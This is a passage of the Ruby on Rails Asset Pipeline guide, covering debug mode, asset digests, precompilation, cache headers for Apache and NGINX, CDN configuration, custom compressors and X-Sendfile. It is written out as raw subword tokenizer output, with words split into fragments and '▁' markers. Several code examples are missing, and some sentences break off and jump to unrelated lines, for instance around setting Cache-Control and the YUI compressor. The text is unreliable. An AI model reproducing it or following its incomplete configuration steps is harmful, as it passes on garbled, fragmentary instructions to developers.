▁ //= ▁require ▁project s
▁ //= ▁require ▁ tic k et s
▁would ▁generate ▁this ▁HTML :
▁< script ▁src =" / assets / core . js ?
▁< script ▁src =" / assets / projects . js ?
▁< script ▁src =" / assets / tic k et s . js ?
▁The ▁` body ` ▁ param ▁is ▁required ▁by ▁Sprockets .
▁### ▁ Runtime ▁ Error ▁Check ing
▁By ▁default ▁the ▁asset ▁pipeline ▁will ▁check ▁for ▁potential ▁errors ▁in ▁development ▁mode ▁during < n > ru n time .
▁To ▁disable ▁this ▁behavior ▁you ▁can ▁set :
▁config . assets . raise _ ru n time _ errors ▁= ▁false
▁When ▁this ▁option ▁is ▁true , ▁the ▁asset ▁pipeline ▁will ▁check ▁if ▁all ▁the ▁assets ▁loaded < n > in ▁your ▁application ▁are ▁included ▁in ▁the ▁` config . assets . precompile ` ▁list . < n >
▁If ▁` config . assets . digest ` ▁is ▁also ▁true , ▁the ▁asset ▁pipeline ▁will ▁require ▁that < n > all ▁requests ▁for ▁assets ▁include ▁digest s .
▁### ▁T ur n ing ▁D ig est s ▁Of f
▁You ▁can ▁turn ▁off ▁digest s ▁by ▁updating ▁` config / environments / development . rb ` ▁to < n > include :
▁config . assets . digest ▁= ▁false
▁When ▁this ▁option ▁is ▁true , ▁digest s ▁will ▁be ▁generated ▁for ▁asset ▁URLs .
▁### ▁T ur n ing ▁De b ug g ing ▁Of f
▁You ▁can ▁turn ▁off ▁debug ▁mode ▁by ▁updating ▁` config / environments / development . rb ` ▁to < n > include :
▁config . assets . debug ▁= ▁false
▁When ▁debug ▁mode ▁is ▁off , ▁Sprockets ▁concatenate s ▁and ▁run s ▁the ▁necessary < n > pre process or s ▁on ▁all ▁files .
▁With ▁debug ▁mode ▁turn ed ▁off ▁the ▁manifest ▁above ▁would < n > generate ▁instead :
▁< script ▁src =" / assets / application . js " ></ script >
▁ Asset s ▁are ▁ compiled ▁and ▁cached ▁on ▁the ▁first ▁request ▁after ▁the ▁server ▁is ▁started . < n >
▁Sprockets ▁set s ▁a ▁` must - re validate ` ▁ Cache - Control ▁HTTP ▁header ▁to ▁reduce ▁request < n > over head ▁on ▁subsequent ▁requests ▁- ▁on ▁these ▁the ▁browser ▁get s ▁a ▁30 4 ▁( N o t ▁Mo d if i ed )< n > response .
▁If ▁any ▁of ▁the ▁files ▁in ▁the ▁manifest ▁have ▁changed ▁between ▁requests , ▁the ▁server < n > respond s ▁with ▁a ▁new ▁ compiled ▁file .
▁De b ug ▁mode ▁can ▁also ▁be ▁enabled ▁in ▁Rails ▁helper ▁methods :
▁<%= ▁stylesheet _ link _ tag ▁" application ", ▁debug : ▁true ▁%>
▁<%= ▁javascript _ include _ tag ▁" application ", ▁debug : ▁true ▁%>
▁The ▁`: debug ` ▁option ▁is ▁re d un d ant ▁if ▁debug ▁mode ▁is ▁already ▁on .
▁In ▁ Product ion
▁In ▁the ▁production ▁environment ▁Sprockets ▁uses ▁the ▁fingerprint ing ▁ scheme ▁out line d < n > a b o ve .
▁By ▁default ▁Rails ▁assume s ▁assets ▁have ▁been ▁pre compiled ▁and ▁will ▁be < n > serve d ▁as ▁static ▁assets ▁by ▁your ▁web ▁server .
▁D ur ing ▁the ▁pre com p il ation ▁p has e ▁an ▁M D 5 ▁is ▁generated ▁from ▁the ▁contents ▁of ▁the < n > compiled ▁files , ▁and ▁inserted ▁into ▁the ▁filename s ▁as ▁they ▁are ▁written ▁to ▁d is c . < n >
▁These ▁fingerprint ed ▁names ▁are ▁used ▁by ▁the ▁Rails ▁helpers ▁in ▁place ▁of ▁the ▁manifest < n > name .
▁For ▁example ▁this :
▁<%= ▁stylesheet _ link _ tag ▁" application " ▁%>
▁generates ▁something ▁like ▁this :
▁< script ▁src =" / assets / application - 9 08 e 2 5 f 4 b f 64 18 68 d 8 68 3022 a 5 b 6 2 f 5 4 . js " ></ script >
▁< link ▁ href =" / assets / application - 4 d d 5 b 10 9 e e 34 39 d a 5 4 f 5 b d f d 78 a 8 04 7 3 . css " ▁m edia =" sc re en " < n > rel =" stylesheet " ▁/>
▁Note : ▁with ▁the ▁ Asset ▁Pipeline ▁the ▁: cache ▁and ▁: concat ▁options ▁are n ' t ▁used < n > any more , ▁delete ▁these ▁options ▁from ▁the ▁` javascript _ include _ tag ` ▁and < n >` stylesheet _ link _ tag `.
▁The ▁fingerprint ing ▁behavior ▁is ▁control l ed ▁by ▁the ▁` config . assets . digest `< n > i nitialization ▁option ▁( which ▁defaults ▁to ▁` true ` ▁for ▁production ▁and ▁` false ` ▁for < n > e verything ▁else ).
▁NOTE : ▁Under ▁normal ▁c ir c um st ance s ▁the ▁default ▁` config . assets . digest ` ▁option < n > s h o ul d ▁not ▁be ▁changed .
▁If ▁there ▁are ▁no ▁digest s ▁in ▁the ▁filename s , ▁and ▁far - future < n > header s ▁are ▁set , ▁remote ▁clients ▁will ▁ never ▁know ▁to ▁ ref et ch ▁the ▁files ▁when ▁their < n > content ▁changes .
▁### ▁P re com p il ing ▁ Asset s
▁Co mp il ed ▁assets ▁are ▁written ▁to ▁the ▁location ▁specified ▁in ▁` config . assets . prefix `. < n >
▁By ▁default , ▁this ▁is ▁the ▁` / assets ` ▁directory .
▁See ▁the ▁next ▁section ▁for < n > information ▁on ▁com p il ing ▁local ly .
▁Add ▁the ▁following ▁line ▁to ▁` C ap file ` :
▁load ▁' deploy / assets '
▁This ▁links ▁the ▁folder ▁specified ▁in ▁` config . assets . prefix ` ▁to ▁` shared / assets `.
▁If ▁you ▁already ▁use ▁this ▁ shared ▁folder ▁you ' ll ▁need ▁to ▁write ▁your ▁own ▁deployment < n > t as k .
▁It ▁is ▁important ▁that ▁this ▁folder ▁is ▁ shared ▁between ▁deployment s ▁so ▁that ▁remote ly < n > cache d ▁pages ▁refer en c ing ▁the ▁old ▁ compiled ▁assets ▁ still ▁work ▁for ▁the ▁life ▁of < n > the ▁cached ▁page .
▁The ▁default ▁match er ▁for ▁com p il ing ▁files ▁includes ▁` application . js `, < n >` application . css ` ▁and ▁all ▁non - JS / CSS ▁files ▁( this ▁will ▁include ▁all ▁image ▁assets < n > a utomatically ) ▁from ▁` app / assets ` ▁folder s ▁including ▁your ▁gems :
▁[ ▁ Proc . new ▁ { ▁| filename , ▁path | ▁path ▁= ~ ▁/ app \ / assets / ▁ && ▁ !
▁% w ( . js ▁ . css ). include ?(
▁File . ext name ( filename ) ) ▁ },
▁/ application . ( css | js ) $ / ▁ ]
▁NOTE : ▁The ▁match er ▁( and ▁other ▁member s ▁of ▁the ▁ precompile ▁array ; ▁see ▁below ) ▁is < n > app li ed ▁to ▁final ▁ compiled ▁file ▁names .
▁This ▁means ▁anything ▁that ▁ compile s ▁to < n > JS / CSS ▁is ▁ exclude d , ▁as ▁well ▁as ▁raw ▁ JS / CSS ▁files ; ▁for ▁example , ▁` . coffee ` ▁and < n >` . scss ` ▁files ▁are ▁** not ** ▁automatically ▁included ▁as ▁they ▁ compile ▁to ▁ JS / CSS .
▁If ▁you ▁have ▁other ▁manifest s ▁or ▁individual ▁stylesheets ▁and ▁JavaScript ▁files ▁to < n > include , ▁you ▁can ▁add ▁them ▁to ▁the ▁` precompile ` ▁array ▁in ▁` config / initializers / assets . rb ` :
▁Rails . application . config . assets . precompile ▁ + = ▁[ ' admin . js ' , ▁' admin . css ' , ▁' s w f Object . js ']
▁NOTE . ▁A l way s ▁specify ▁an ▁expected ▁ compiled ▁filename ▁that ▁end s ▁with ▁ . js ▁or ▁ . css ,< n > even ▁if ▁you ▁want ▁to ▁add ▁Sass ▁or ▁CoffeeScript ▁files ▁to ▁the ▁ precompile ▁array .
▁This ▁is ▁used ▁by ▁the ▁Rails < n > helper ▁methods ▁to ▁avoid ▁hand ing ▁the ▁mapping ▁requests ▁back ▁to ▁Sprockets .
▁A < n > t y p ical ▁manifest ▁file ▁look s ▁like :
▁{" file s " : {" application - 7 23 d 1 be 6 cc 7 4 1 a 3 a a b b 1 ce c 2 4 27 6 d 68 1 . js " : {" log ical _ path ":" application . js ", " m time " : "2013-0 7 - 2 6 T 22 : 5 5 : 0 3- 07 : 00 ", " size " : 3 02 5 06 ,
▁" digest ":" 7 23 d 1 be 6 cc 7 4 1 a 3 a a b b 1 ce c 2 4 27 6 d 68 1 " }, " application - 12 b 3 c 7 d d 7 4 d 2 e 9 d f 37 e 7 c b b 1 e fa 76 a 6 d . css " : {" log ical _ path ":" application . css ", " m time " : "2013-0 7 - 2 6 T 22 : 5 4 : 5 4 - 07 : 00 ", " size " : 15 60 ,
▁" digest ":" 12 b 3 c 7 d d 7 4 d 2 e 9 d f 37 e 7 c b b 1 e fa 76 a 6 d " }, " application - 1 c 57 5 27 89 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 f d 4 c 2 . css " : {" log ical _ path ":" application . css ", " m time " : "2013-0 7 - 2 6 T 22 : 5 6 : 17 - 07 : 00 ", " size " : 1 59 1,
▁" digest ":" 1 c 57 5 27 89 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 f d 4 c 2 " }, " fa v ic on - a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 . ic o " : {" log ical _ path ":" fa v ic on . ic o ", " m time " : "2013-0 7 - 2 6 T 23 : 00 : 10 - 07 : 00 ", " size " : 140 6 ,
▁" digest ":" a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 " }, " my _ image - 23 1 a 68 0 f 23 88 7 d 9 d d 7 07 10 e a 5 e f d 3 c 6 2 . png " : {" log ical _ path ":" my _ image . png ", " m time " : "2013-0 7 - 2 6 T 23 : 00 : 27 - 07 : 00 ", " size " : 6 64 6 ,
▁" digest ":" 23 1 a 68 0 f 23 88 7 d 9 d d 7 07 10 e a 5 e f d 3 c 6 2 "} }, " assets " : {" application . js " :
▁" application - 7 23 d 1 be 6 cc 7 4 1 a 3 a a b b 1 ce c 2 4 27 6 d 68 1 . js ", " application . css " :
▁" application - 1 c 57 5 27 89 5 88 ac 18 d 7 e 1 a 50 b 1 f 0 f d 4 c 2 . css ",
▁" fa v ic on . ic o ":" fa v ic on a 9 c 64 1 b f 2 b 8 1 f 04 76 e 87 6 f 7 c 5 e 37 59 6 9 . ic o ", " my _ image . png " :
▁" my _ image - 23 1 a 68 0 f 23 88 7 d 9 d d 7 07 10 e a 5 e f d 3 c 6 2 . png "} }
▁The ▁default ▁location ▁for ▁the ▁manifest ▁is ▁the ▁root ▁of ▁the ▁location ▁specified ▁in < n >` config . assets . prefix ` ▁( ' / assets ' ▁by ▁default ).
▁NOTE : ▁If ▁there ▁are ▁missing ▁pre compiled ▁files ▁in ▁production ▁you ▁will ▁get ▁an < n >` Sprockets :: Helpers :: Rails Helper :: Asset P at h s :: Asset N o t P re compiled Error `< n > exception ▁indicat ing ▁the ▁name ▁of ▁the ▁missing ▁file ( s ).
▁#### ▁F ar - future ▁Exp ir es ▁Header
▁P re compiled ▁assets ▁exist ▁on ▁the ▁file ▁system ▁and ▁are ▁served ▁directly ▁by ▁your ▁web < n > server .
▁They ▁do ▁not ▁have ▁far - future ▁headers ▁by ▁default , ▁so ▁to ▁get ▁the ▁benefit ▁of < n > f ing er print ing ▁you ' ll ▁have ▁to ▁update ▁your ▁server ▁configuration ▁to ▁add ▁those < n > header s .
▁For ▁Apache :
▁`` ` ap a ch e
▁# ▁The ▁Exp ir es * ▁directive s ▁requires ▁the ▁Apache ▁module
▁# ▁` mod _ expire s ` ▁to ▁be ▁enabled .
▁< Location ▁/ assets / >
▁# ▁Use ▁of ▁ ETag ▁is ▁d is c our age d ▁when ▁L as t - M o d if i ed ▁is ▁present
▁Header ▁un set ▁ ETag
▁File ETag ▁N one
▁# ▁R F C ▁say s ▁only ▁cache ▁for ▁1 ▁ year
▁Exp ir es Active ▁On
▁Exp ir es D e fa ul t ▁" access ▁plus ▁1 ▁ year "
▁For ▁N G IN X :
▁`` ` n g in x
▁location ▁ ~ ▁ ^ / assets / ▁ {
▁expire s ▁1 y ;
▁add _ header ▁ Cache - Control ▁public ;
▁add _ header ▁ ETag ▁" " ;
▁break ;
▁### ▁ Local ▁P re com p il ation
▁There ▁are ▁sever al ▁reason s ▁why ▁you ▁m ight ▁want ▁to ▁ precompile ▁your ▁assets ▁local ly . < n >
▁A mong ▁them ▁are :
▁* ▁You ▁may ▁not ▁have ▁write ▁access ▁to ▁your ▁production ▁file ▁system .
▁* ▁You ▁may ▁be ▁deploying ▁to ▁more ▁than ▁one ▁server , ▁and ▁want ▁to ▁avoid < n > d u plication ▁of ▁work .
▁* ▁You ▁may ▁be ▁doing ▁frequent ▁deploy s ▁that ▁do ▁not ▁include ▁asset ▁changes .
▁ Local ▁com p il ation ▁allows ▁you ▁to ▁commit ▁the ▁ compiled ▁files ▁into ▁source ▁control ,< n > and ▁deploy ▁as ▁normal .
▁There ▁are ▁three ▁caveat s :
▁* ▁You ▁must ▁not ▁run ▁the ▁C api str an o ▁deployment ▁task ▁that ▁ precompile s ▁assets .
▁* ▁You ▁must ▁ensure ▁any ▁necessary ▁ compressor s ▁or ▁ mini fi ers ▁are < n > available ▁on ▁your ▁development ▁system .
▁* ▁You ▁must ▁change ▁the ▁following ▁application ▁configuration ▁setting :
▁In ▁` config / environments / development . rb `, ▁place ▁the ▁following ▁line :
▁config . assets . prefix ▁= ▁" / dev - assets "
▁The ▁` prefix ` ▁change ▁make s ▁Sprockets ▁use ▁a ▁different ▁URL ▁for ▁serving ▁assets ▁in < n > development ▁mode , ▁and ▁pass ▁all ▁requests ▁to ▁Sprockets .
▁The ▁prefix ▁is ▁ still ▁set ▁to < n >` / assets ` ▁in ▁the ▁production ▁environment .
▁With out ▁this ▁change , ▁the ▁application < n > w o ul d ▁serve ▁the ▁pre compiled ▁assets ▁from ▁` / assets ` ▁in ▁development , ▁and ▁you ▁would < n > not ▁see ▁any ▁local ▁changes ▁un til ▁you ▁ compile ▁assets ▁again .
▁In ▁practice , ▁this ▁will ▁allow ▁you ▁to ▁ precompile ▁local ly , ▁have ▁those ▁files ▁in ▁your < n > working ▁ tree , ▁and ▁commit ▁those ▁files ▁to ▁source ▁control ▁when ▁needed .
▁De ve lo p ment < n > m ode ▁will ▁work ▁as ▁expected .
▁### ▁L ive ▁Co mp il ation
▁In ▁some ▁c ir c um st ance s ▁you ▁may ▁wish ▁to ▁use ▁live ▁com p il ation .
▁In ▁this ▁mode ▁all < n > request s ▁for ▁assets ▁in ▁the ▁pipeline ▁are ▁handle d ▁by ▁Sprockets ▁directly .
▁To ▁enable ▁this ▁option ▁set :
▁config . assets . compile ▁= ▁true
▁On ▁the ▁first ▁request ▁the ▁assets ▁are ▁ compiled ▁and ▁cached ▁as ▁out line d ▁in < n > development ▁above , ▁and ▁the ▁manifest ▁names ▁used ▁in ▁the ▁helpers ▁are ▁alter ed ▁to < n > include ▁the ▁M D 5 ▁hash .
▁Sprockets ▁also ▁set s ▁the ▁` Cache - Control ` ▁HTTP ▁header ▁to ▁` ma x - age = 3 15 36 000 `.
▁This < n > sign al s ▁all ▁cache s ▁between ▁your ▁server ▁and ▁the ▁client ▁browser ▁that ▁this ▁content < n > ( the ▁file ▁served ) ▁can ▁be ▁cached ▁for ▁1 ▁ year .
▁The ▁effect ▁of ▁this ▁is ▁to ▁reduce ▁the < n > number ▁of ▁requests ▁for ▁this ▁asset ▁from ▁your ▁server ; ▁the ▁asset ▁has ▁a ▁good ▁chance < n > of ▁being ▁in ▁the ▁local ▁browser ▁cache ▁or ▁some ▁in ter m edia t e ▁cache .
▁This ▁mode ▁uses ▁more ▁memory , ▁perform s ▁more ▁p o or ly ▁than ▁the ▁default ▁and ▁is ▁not < n > re com m end ed .
▁If ▁you ▁are ▁deploying ▁a ▁production ▁application ▁to ▁a ▁system ▁without ▁any < n > pre - ex ist ing ▁JavaScript ▁runtime s , ▁you ▁may ▁want ▁to ▁add ▁one ▁to ▁your ▁Gemfile :
▁group ▁: production ▁do
▁gem ▁' the ruby r ac er '
▁### ▁CDN s
▁CDN ▁stand s ▁for ▁[ Content ▁ Delivery < n > N et work ]( http :// en . wiki p edia . org / wiki / Content _ delivery _ net work ), ▁they ▁are < n > p r i m ar ily ▁design ed ▁to ▁cache ▁assets ▁all ▁over ▁the ▁world ▁so ▁that ▁when ▁a ▁browser < n > request s ▁the ▁asset , ▁a ▁cached ▁copy ▁will ▁be ▁ ge ographic ally ▁close ▁to ▁that ▁browser . < n >
▁If ▁you ▁are ▁serving ▁assets ▁directly ▁from ▁your ▁Rails ▁server ▁in ▁production , ▁the < n > b est ▁practice ▁is ▁to ▁use ▁a ▁CDN ▁in ▁front ▁of ▁your ▁application .
▁A ▁common ▁pattern ▁for ▁using ▁a ▁CDN ▁is ▁to ▁set ▁your ▁production ▁application ▁as ▁the < n > " origin " ▁server .
▁This ▁means ▁when ▁a ▁browser ▁requests ▁an ▁asset ▁from ▁the ▁CDN ▁and < n > the re ▁is ▁a ▁cache ▁m is s , ▁it ▁will ▁gra b ▁the ▁file ▁from ▁your ▁server ▁on ▁the ▁f ly ▁and < n > the n ▁cache ▁it .
▁The ▁next ▁request ▁to ▁the < n > C D N ▁that ▁comes ▁in ▁to ▁the ▁same ▁URL ▁will ▁hit ▁the ▁cached ▁copy .
▁When ▁the ▁CDN ▁can < n > serve ▁an ▁asset ▁directly ▁the ▁request ▁ never ▁ touch es ▁your ▁Rails ▁server .
▁S ince ▁the < n > assets ▁from ▁a ▁CDN ▁are ▁ ge ographic ally ▁close r ▁to ▁the ▁browser , ▁the ▁request ▁is < n > fa s ter , ▁and ▁since ▁your ▁server ▁does n ' t ▁need ▁to ▁sp end ▁time ▁serving ▁assets , ▁it ▁can < n > f o c us ▁on ▁serving ▁application ▁code ▁as ▁ fa st ▁as ▁possible .
▁#### ▁Set ▁up ▁a ▁CDN ▁to ▁S er ve ▁Static ▁ Asset s
▁To ▁set ▁up ▁your ▁CDN ▁you ▁have ▁to ▁have ▁your ▁application ▁running ▁in ▁production ▁on < n > the ▁in ter net ▁at ▁a ▁public ally ▁available ▁URL , ▁for ▁example ▁` example . com `.
▁Next < n > you ' ll ▁need ▁to ▁sign ▁up ▁for ▁a ▁CDN ▁ service ▁from ▁a ▁cloud ▁host ing ▁provide r .
▁When ▁you < n > do ▁this ▁you ▁need ▁to ▁configure ▁the ▁" origin " ▁of ▁the ▁CDN ▁to ▁point ▁back ▁at ▁your < n > web site ▁` example . com `, ▁check ▁your ▁provide r ▁for ▁documentation ▁on ▁ configuring ▁the < n > origin ▁server .
▁The ▁CDN ▁you ▁pro v is ion ed ▁should ▁give ▁you ▁a ▁custom ▁sub domain ▁for ▁your ▁application < n > such ▁as ▁` my cd n sub domain . fi ctional - cd n . com ` ▁( not e ▁ fi ctional - cd n . com ▁is ▁not ▁a < n > valid ▁CDN ▁provide r ▁at ▁the ▁time ▁of ▁this ▁writing ).
▁Now ▁that ▁you ▁have ▁configured < n > your ▁CDN ▁server , ▁you ▁need ▁to ▁tell ▁browsers ▁to ▁use ▁your ▁CDN ▁to ▁gra b ▁assets < n > instead ▁of ▁your ▁Rails ▁server ▁directly .
▁You ▁can ▁do ▁this ▁by ▁ configuring ▁Rails ▁to < n > set ▁your ▁CDN ▁as ▁the ▁asset ▁host ▁instead ▁of ▁using ▁a ▁relative ▁path .
▁To ▁set ▁your < n > asset ▁host ▁in ▁Rails , ▁you ▁need ▁to ▁set ▁` config . action _ controller . asset _ host ` ▁in < n >` config / production . rb ` :
▁config . action _ controller . asset _ host ▁= ▁' my cd n sub domain . fi ctional - cd n . com '
▁NOTE : ▁You ▁only ▁need ▁to ▁provide ▁the ▁" host ", ▁this ▁is ▁the ▁sub domain ▁and ▁root < n > domain , ▁you ▁do ▁not ▁need ▁to ▁specify ▁a ▁protocol ▁or ▁" scheme " ▁such ▁as ▁` http :// ` ▁or < n >` https :// `.
▁When ▁a ▁web ▁page ▁is ▁request ed , ▁the ▁protocol ▁in ▁the ▁link ▁to ▁your ▁asset < n > that ▁is ▁generated ▁will ▁match ▁how ▁the ▁web page ▁is ▁access ed ▁by ▁default .
▁You ▁can ▁also ▁set ▁this ▁value ▁through ▁an ▁[ environment < n > variable ]( http :// en . wiki p edia . org / wiki / Environment _ variable ) ▁to ▁make ▁running ▁a < n > staging ▁copy ▁of ▁your ▁site ▁easier :
▁config . action _ controller . asset _ host ▁= ▁ ENV [' C D N _ H O ST ']
▁On ce ▁you ▁have ▁configured ▁your ▁server ▁and ▁your ▁CDN ▁when ▁you ▁serve ▁a ▁web page ▁that < n > has ▁an ▁asset :
▁<%= ▁asset _ path (' s m i le . png ') ▁%>
▁Instead ▁of ▁return ing ▁a ▁path ▁such ▁as ▁` / assets / s m i le . png ` ▁( digest s ▁are ▁left ▁out < n > for ▁read ability ).
▁The ▁URL ▁generated ▁will ▁have ▁the ▁full ▁path ▁to ▁your ▁CDN .
▁ http :// my cd n sub domain . fi ctional - cd n . com / assets / s m i le . png
▁If ▁the ▁CDN ▁does ▁not ▁have ▁a ▁copy ▁it < n > will ▁try ▁to ▁find ▁it ▁a ▁the ▁" origin " ▁` example . com / assets / s m i le . png ` ▁and ▁the n ▁store < n > it ▁for ▁future ▁use .
▁If ▁you ▁want ▁to ▁serve ▁only ▁some ▁assets ▁from ▁your ▁CDN , ▁you ▁can ▁use ▁custom ▁`: host `< n > option ▁your ▁asset ▁helper , ▁which ▁overwrit es ▁value ▁set ▁in < n >` config . action _ controller . asset _ host `.
▁<%= ▁asset _ path ▁' image . png ' , ▁host : ▁' my cd n sub domain . fi ctional - cd n . com ' ▁%>
▁#### ▁C us to m ize ▁CDN ▁ Caching ▁Be ha v i or
▁A ▁CDN ▁works ▁by ▁caching ▁content .
▁If ▁the ▁CDN ▁has ▁sta le ▁or ▁ bad ▁content , ▁the n ▁it ▁is < n > h ur ting ▁rather ▁than ▁help ing ▁your ▁application .
▁The ▁purpose ▁of ▁this ▁section ▁is ▁to < n > de sc r i be ▁general ▁caching ▁behavior ▁of ▁most ▁CDN s , ▁your ▁specific ▁provide r ▁may < n > be ha ve ▁slightly ▁different ly .
▁#### # ▁CDN ▁ Request ▁ Caching
▁Whi le ▁a ▁CDN ▁is ▁describe d ▁as ▁being ▁good ▁for ▁caching ▁assets , ▁in ▁real ity ▁cache s ▁the < n > ent i re ▁request .
▁The < n > most ▁important ▁one ▁being ▁` Cache - Control ` ▁which ▁tell s ▁the ▁CDN ▁( and ▁web ▁browsers )< n > how ▁to ▁cache ▁contents .
▁This ▁means ▁that ▁if ▁some one ▁requests ▁an ▁asset ▁that ▁does < n > not ▁exist ▁` / assets / i - do n t - ex ist . png ` ▁and ▁your ▁Rails ▁application ▁returns ▁a ▁4 04 ,< n > the n ▁your ▁CDN ▁will ▁likely ▁cache ▁the ▁4 04 ▁page ▁if ▁a ▁valid ▁` Cache - Control ` ▁header < n > is ▁present .
▁#### # ▁CDN ▁Header ▁De b ug g ing
▁One ▁way ▁to ▁check ▁the ▁headers ▁are ▁cached ▁properly ▁in ▁your ▁CDN ▁is ▁by ▁using ▁[ curl ]( < n > http :// explain s hel l . com / explain ? c m d = curl + - I + http % 3 A % 2 F % 2 F www . example . com ).
▁You < n > can ▁request ▁the ▁headers ▁from ▁both ▁your ▁server ▁and ▁your ▁CDN ▁to ▁verify ▁they ▁are < n > the ▁same :
▁HTTP /1.1 ▁200 ▁O K < n > Server : ▁Co w b o y
▁Date : ▁Sun , ▁24 ▁A ug ▁2014 ▁20 : 27 : 50 ▁GMT
▁ Connection : ▁keep - al ive
▁L as t - M o d if i ed : ▁Thu , ▁ 08 ▁May ▁2014 ▁01 : 2 4 : 1 4 ▁GMT < n > Content - Type : ▁text / css
▁ Cache - Control : ▁public , ▁ ma x - age = 2 59 200 0
▁ Content - L en g th : ▁ 12 6 5 60
▁Vi a : ▁1. 1 ▁ ve g ur
▁ V ers us ▁the ▁CDN ▁copy .
▁HTTP /1.1 ▁200 ▁O K ▁ Server : ▁Co w b o y
▁ Content - Type : ▁text / css
▁ Cache - Control : < n > public , ▁ ma x - age = 2 59 200 0
▁A c ce p t - Range s :
▁by t es
▁Date : ▁Sun , ▁24 ▁A ug ▁2014 ▁20 : 28 : 4 5 ▁GMT
▁Vi a : ▁1. 1 ▁var n is h
▁A ge : ▁ 88 58 1 4
▁ X - S er ve d - B y : ▁cache - d f w 18 28 - D F W
▁ X - Cache : ▁H I T
▁ X - Cache - H it s :
▁ X - Time r : ▁S 140 89 12 12 5 . 2 1 16 38 2 12 , V S 0, V E 0
▁Check ▁your ▁CDN ▁documentation ▁for ▁any ▁ additional ▁information ▁they ▁may ▁provide < n > such ▁as ▁` X - Cache ` ▁or ▁for ▁any ▁ additional ▁headers ▁they ▁may ▁add .
▁#### # ▁CDN s ▁and ▁the ▁ Cache - Control ▁Header
▁The ▁[ cache ▁control < n > header ]( http :// www . w 3 . org / Protocol s / r f c 2 6 16 / r f c 2 6 16 - sec 1 4 . html # sec 1 4 . 9 ) ▁is ▁a ▁W 3 C < n > specific ation ▁that ▁describe s ▁how ▁a ▁request ▁can ▁be ▁cached .
▁When ▁no ▁CDN ▁is ▁used , ▁a < n > browser ▁will ▁use ▁this ▁information ▁to ▁cache ▁contents .
▁This ▁is ▁very ▁helpful ▁for < n > assets ▁that ▁are ▁not ▁modified ▁so ▁that ▁a ▁browser ▁does ▁not ▁need ▁to ▁re - download ▁a < n > web site ' s ▁CSS ▁or ▁javascript ▁on ▁every ▁request .
▁General ly ▁we ▁want ▁our ▁Rails ▁server < n > to ▁tell ▁our ▁CDN ▁( and ▁browser ) ▁that ▁the ▁asset ▁is ▁" public ", ▁that ▁means ▁any ▁cache < n > can ▁store ▁the ▁request .
▁Also ▁we ▁commonly ▁want ▁to ▁set ▁` ma x - age ` ▁which ▁is ▁how ▁long < n > the ▁cache ▁will ▁store ▁the ▁object ▁before ▁invalid at ing ▁the ▁cache .
▁The ▁` ma x - age `< n > value ▁is ▁set ▁to ▁second s ▁with ▁a ▁ maximum ▁possible ▁value ▁of ▁` 3 15 36 000 ` ▁which ▁is ▁one < n > year .
▁You ▁can ▁do ▁this ▁in ▁your ▁rails ▁application ▁by ▁setting
▁For < n > example
▁The ▁[ Y U I ▁CSS < n > compressor ]( http :// yui . github . io / yui compressor / css . html ) ▁provides < n > mini f ic ation .
▁If ▁you ▁are ▁using ▁Mac ▁OS ▁ X ▁or < n > W in do w s ▁you ▁have ▁a ▁JavaScript ▁runtime ▁installed ▁in ▁your ▁operat ing ▁system .
▁NOTE : ▁The ▁` config . assets . compress ` ▁initialization ▁option ▁is ▁no ▁longer ▁used ▁in < n > Rails ▁4 ▁to ▁enable ▁either ▁CSS ▁or ▁JavaScript ▁compression .
▁Setting ▁it ▁will ▁have ▁no < n > e ffect ▁on ▁the ▁application .
▁Instead , ▁setting ▁` config . assets . css _ compressor ` ▁and < n >` config . assets . js _ compressor ` ▁will ▁control ▁compression ▁of ▁CSS ▁and ▁JavaScript < n > assets .
▁### ▁Using ▁Your ▁O w n ▁Co mp re s s or
▁The ▁ compressor ▁config ▁settings ▁for ▁CSS ▁and ▁JavaScript ▁also ▁take ▁any ▁object . < n >
▁This ▁object ▁must ▁have ▁a ▁` compress ` ▁method ▁that ▁take s ▁a ▁string ▁as ▁the ▁so le < n > argument ▁and ▁it ▁must ▁return ▁a ▁string .
▁class ▁ Trans form er
▁def ▁ compress ( string )
▁do _ something _ return ing _ a _ string ( string )
▁To ▁enable ▁this , ▁pass ▁a ▁new ▁object ▁to ▁the ▁config ▁option ▁in ▁` application . rb ` :
▁config . assets . css _ compressor ▁= ▁ Trans form er . new
▁### ▁ Chang ing ▁the ▁ _ assets _ ▁Path
▁The ▁public ▁path ▁that ▁Sprockets ▁uses ▁by ▁default ▁is ▁` / assets `.
▁This ▁can ▁be ▁changed ▁to ▁something ▁else :
▁config . assets . prefix ▁= ▁" / some _ other _ path "
▁This ▁is ▁a ▁hand y ▁option ▁if ▁you ▁are ▁updating ▁an ▁older ▁project ▁that ▁did n ' t ▁use ▁the < n > asset ▁pipeline ▁and ▁already ▁uses ▁this ▁path ▁or ▁you ▁wish ▁to ▁use ▁this ▁path ▁for < n > a ▁new ▁resource .
▁### ▁ X - Sendfile ▁Header s
▁The ▁ X - Sendfile ▁header ▁is ▁a ▁directive ▁to ▁the ▁web ▁server ▁to ▁ignore ▁the ▁response < n > from ▁the ▁application , ▁and ▁instead ▁serve ▁a ▁specified ▁file ▁from ▁d is k .
▁This ▁option < n > is ▁off ▁by ▁default , ▁but ▁can ▁be ▁enabled ▁if ▁your ▁server ▁supports ▁it .
▁When ▁enabled ,< n > this ▁passes ▁responsib il ity ▁for ▁serving ▁the ▁file ▁to ▁the ▁web ▁server , ▁which ▁is < n > fa s ter .
▁H a ve ▁a ▁look ▁at ▁[ s end _ file ]( http :// api . rubyonrails . org / classes / ActionController / Data S t re am ing . html # method - i - s end _ file )< n > on ▁how ▁to ▁use ▁this ▁feature .
▁Apache ▁and ▁N G IN X ▁support ▁this ▁option , ▁which ▁can ▁be ▁enabled ▁in < n >` config / environments / production . rb ` :
▁# ▁config . action _ dispatch . x _ s end file _ header ▁= ▁" X - Sendfile " ▁# ▁for ▁Apache
▁# ▁config . action _ dispatch . x _ s end file _ header ▁= ▁' X - A cc el - Redirect ' ▁# ▁for ▁N G IN X
▁WARNING : ▁If ▁you ▁are ▁upgrading ▁an ▁existing ▁application ▁and ▁intend ▁to ▁use ▁this < n > option , ▁take ▁care ▁to ▁ past e ▁this ▁configuration ▁option ▁only ▁into ▁` production . rb `< n > and ▁any ▁other ▁environments ▁you ▁define ▁with ▁production ▁behavior ▁( not < n >` application . rb ` ).
